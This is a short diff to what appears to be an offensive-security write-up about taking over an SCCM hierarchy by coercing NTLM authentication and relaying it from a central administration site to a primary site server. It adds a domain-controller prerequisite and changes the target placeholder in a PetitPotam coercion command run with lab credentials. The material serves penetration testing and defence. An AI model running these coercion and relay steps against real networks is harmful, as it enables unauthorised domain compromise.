@@ -28,6 +28,7 @@ Hierarchy takeover via NTLM coercion and relay from CAS to origin primary site s
     - `RestrictReceivingNTLMTraffic` = `0` or not present
     - Coercion target is local admin (to access RPC/admin shares)
 - Domain controller settings:
+    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains relay target
    
 
 
@@ -118,7 +119,7 @@ Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra
 
 ```
 ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
-└─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <PASSIVE_SITE_SERVER_IP> 
+└─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <CAS_SITE_SERVER_IP> 
 
 Trying pipe lsarpc
 [-] Connecting to ncacn_np:passive.internal.lab[\PIPE\lsarpc]
